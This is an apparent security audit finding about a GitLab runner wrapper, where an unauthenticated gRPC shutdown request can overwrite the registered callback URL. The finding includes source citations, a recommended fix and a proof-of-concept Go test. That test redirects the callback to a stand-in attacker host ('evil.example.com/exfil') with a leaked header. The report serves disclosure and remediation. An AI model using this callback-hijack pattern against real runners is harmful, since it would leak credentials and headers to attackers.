### Title
`InitiateGracefulShutdown` allows unauthenticated overwrite of registered `shutdownCallback` - ([File: helpers/runner_wrapper/wrapper.go])

### Summary
`Wrapper.InitiateGracefulShutdown` calls `setShutdownCallback` with whatever `ShutdownCallbackDef` is supplied in the gRPC request, unconditionally replacing `w.shutdownCallback` with no check for prior registration or caller identity. Given the (assumed, per question 4) precondition that the gRPC listener is reachable by an untrusted party, any caller who wins the race against the legitimate control-plane call can overwrite the callback that will run on process exit.

### Finding Description
`InitiateGracefulShutdown` signals the wrapped process and, if `req.ShutdownCallbackDef().URL()` is non-empty, calls `w.setShutdownCallback(api.NewShutdownCallback(w.log, req.ShutdownCallbackDef()))`: [1](#0-0) 

`setShutdownCallback` takes the lock and unconditionally overwrites `w.shutdownCallback`, with no guard checking whether a callback is already set: [2](#0-1) 

When the wrapped process exits, `handleWrappedProcessShutdown` → `sendShutdownCallback` reads `w.shutdownCallback` under the lock and runs whichever value is currently stored, with no way to distinguish who set it: [3](#0-2) 

The gRPC server handler `InitGracefulShutdown` builds the `ShutdownCallbackDef` straight from the incoming protobuf request fields (`Url`, `Method`, `Headers`) and passes it to `wrapper.InitiateGracefulShutdown` without any authentication or authorization check, and without verifying it is the first/only caller: [4](#0-3) 

So the code confirms the described race precisely: there is no "already set" guard and no caller-identity check anywhere between the gRPC entrypoint and the final overwrite of `w.shutdownCallback`. If two `InitiateGracefulShutdown` calls arrive, the second one's callback (URL, method, headers) always wins, regardless of which caller was legitimate.

### Impact Explanation
If reached, the last successful `InitiateGracefulShutdown` call fully controls the destination URL, HTTP method, and headers used by `ShutdownCallback.Run` when the wrapped process exits — enabling redirection of the callback (and any headers/data it carries) to an attacker-controlled endpoint instead of the intended GitLab-callback target, i.e., the SSRF/header-leak impact described in the scoped impact.

### Likelihood Explanation
This finding's validity is entirely contingent on the precondition carried over from "question 4" — that an unprivileged party (a job/pipeline) can reach the wrapper's gRPC listener. I could not independently verify that precondition in this pass: the listener is configured via `--grpc-listen` (default `tcp://localhost:7777`, or a `unix://` socket) and created in `commands/wrapper.go`'s `createListener`/`Execute`: [5](#0-4) 
Whether a job process can actually reach this listener depends on executor network/namespace isolation (e.g., host networking, shared unix socket mounts), which is outside the file/function scope of this question and was not confirmed here. Assuming that reachability precondition holds (as stipulated by the question), the overwrite itself is trivially reachable and repeatable: no auth, no idempotency/"already set" guard, and the race is a simple two-call sequence over the exposed RPC.

### Recommendation
- Add an authentication/authorization mechanism to the wrapper's gRPC endpoint (e.g., a shared secret/token generated per wrapper instance and passed to the legitimate control-plane caller only, checked in `InitGracefulShutdown`/`InitForcefulShutdown`).
- In `setShutdownCallback`, reject (or ignore) a new callback if one is already registered, so only the first legitimate registration is honored:
```go
func (w *Wrapper) setShutdownCallback(callback api.ShutdownCallback) error {
    w.lock.Lock()
    defer w.lock.Unlock()
    if w.shutdownCallback != nil {
        return errShutdownCallbackAlreadySet
    }
    w.shutdownCallback = callback
    return nil
}
```
- Restrict the listener default to a local, permission-restricted unix socket rather than `tcp://localhost`, and ensure it is not reachable from job/build containers (network namespace isolation).

### Proof of Concept
Go unit test in `helpers/runner_wrapper/wrapper_test.go`:
```go
func TestInitiateGracefulShutdown_RejectsOverwriteOfCallback(t *testing.T) {
    w := New(logrus.New(), "sleep", []string{"1"})
    // simulate process already running
    w.setProcess(fakeProcess{})

    legit := api.NewShutdownCallbackDef("https://gitlab.example.com/callback", "POST", nil)
    evil := api.NewShutdownCallbackDef("https://evil.example.com/exfil", "POST", map[string]string{"X-Leak": "secret"})

    err1 := w.InitiateGracefulShutdown(api.NewInitGracefulShutdownRequest(legit))
    require.NoError(t, err1)

    err2 := w.InitiateGracefulShutdown(api.NewInitGracefulShutdownRequest(evil))
    // Expect this to fail / be ignored once fix is applied:
    require.Error(t, err2)

    // Assert stored callback still targets the legitimate URL
    assert.Equal(t, "https://gitlab.example.com/callback", w.shutdownCallback.URL())
}
```
Currently (pre-fix), this test would show `err2 == nil` and `w.shutdownCallback` pointing at `https://evil.example.com/exfil`, confirming the overwrite occurs exactly as described in the question. Full exploitation additionally requires establishing that the gRPC listener is reachable from an unprivileged job context, which is not proven within this file/function pair and should be validated together with the "question 4" listener-exposure finding.

### Citations

**File:** helpers/runner_wrapper/wrapper.go (L115-144)
```go
func (w *Wrapper) handleWrappedProcessShutdown(ctx context.Context, err error) {
	if err != nil {
		w.setFailureReason(err)
	}

	w.setProcess(nil)
	w.setStatus(api.StatusStopped)

	go w.sendShutdownCallback(ctx)
}

func (w *Wrapper) setFailureReason(err error) {
	w.lock.Lock()
	defer w.lock.Unlock()

	w.failureReason = err
}

func (w *Wrapper) sendShutdownCallback(ctx context.Context) {
	w.lock.Lock()
	c := w.shutdownCallback
	w.lock.Unlock()

	if c == nil {
		w.log.Info("No shutdown callback registered; skipping")
		return
	}

	c.Run(ctx)
}
```

**File:** helpers/runner_wrapper/wrapper.go (L209-237)
```go
func (w *Wrapper) InitiateGracefulShutdown(req api.InitGracefulShutdownRequest) error {
	w.lock.RLock()
	p := w.process
	w.lock.RUnlock()

	if p == nil {
		return api.ErrProcessNotInitialized
	}

	w.log.Info("Initiating graceful shutdown of the process")

	err := p.Signal(gracefulShutdownSignal)
	if err != nil {
		return fmt.Errorf("could not send graceful shutdown signal: %w", err)
	}

	if req.ShutdownCallbackDef().URL() != "" {
		w.log.
			WithField("target", req.ShutdownCallbackDef().URL()).
			WithField("method", req.ShutdownCallbackDef().Method()).
			Debug("Registering shutdown callback")

		w.setShutdownCallback(api.NewShutdownCallback(w.log, req.ShutdownCallbackDef()))
	}

	w.setStatus(api.StatusInShutdown)

	return nil
}
```

**File:** helpers/runner_wrapper/wrapper.go (L260-265)
```go
func (w *Wrapper) setShutdownCallback(callback api.ShutdownCallback) {
	w.lock.Lock()
	defer w.lock.Unlock()

	w.shutdownCallback = callback
}
```

**File:** helpers/runner_wrapper/api/server/server.go (L66-93)
```go
func (s *Server) InitGracefulShutdown(
	_ context.Context,
	req *pb.InitGracefulShutdownRequest,
) (*pb.InitGracefulShutdownResponse, error) {
	s.log.Debug("Received InitGracefulShutdown request")

	sc := api.NewShutdownCallbackDef(
		req.GetShutdownCallback().GetUrl(),
		req.GetShutdownCallback().GetMethod(),
		req.GetShutdownCallback().GetHeaders(),
	)

	r := api.NewInitGracefulShutdownRequest(sc)

	err := s.wrapper.InitiateGracefulShutdown(r)
	if err != nil {
		if errors.Is(err, api.ErrProcessNotInitialized) {
			err = nil
		}
	}

	resp := &pb.InitGracefulShutdownResponse{
		Status:        api.Statuses.Map(s.wrapper.Status()),
		FailureReason: s.wrapper.FailureReason(),
	}

	return resp, err
}
```

**File:** commands/wrapper.go (L58-106)
```go
func (c *RunnerWrapperCommand) Execute(cctx *cli.Context) {
	logrus.AddHook(new(logHook))
	log := logrus.WithField("wrapper", true)
	grpcLog := log.WithField("grpc-listen-addr", c.GRPCListen)

	path, err := os.Executable()
	if err != nil {
		log.WithError(err).Fatal("Failed to get executable path")
	}

	l, err := c.createListener()
	if err != nil {
		grpcLog.WithError(err).Fatal("Failed to create listener")
	}

	ctx, cancelFn := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM, syscall.SIGQUIT)
	defer cancelFn()

	w := runner_wrapper.New(log, path, cctx.Args())
	w.SetTerminationTimeout(c.ProcessTerminationTimeout)

	srv := server.New(grpcLog, w)

	go srv.Listen(l)

	err = w.Run(ctx)
	if err != nil {
		log.WithError(err).Fatal("Failed while executing wrapped command")
	}

	srv.Stop()
	log.Info("All wrapper tasks finished. See you!")
}

func (c *RunnerWrapperCommand) createListener() (net.Listener, error) {
	uri, err := url.ParseRequestURI(c.GRPCListen)
	if err != nil {
		return nil, fmt.Errorf("%w: %w", errFailedToParseGRPCAddress, err)
	}

	switch uri.Scheme {
	case "unix":
		return net.Listen("unix", uri.Path)
	case "tcp":
		return net.Listen("tcp", uri.Host)
	default:
		return nil, fmt.Errorf("%w: %s", errUnsupportedGRPCAddressScheme, uri.Scheme)
	}
}
```
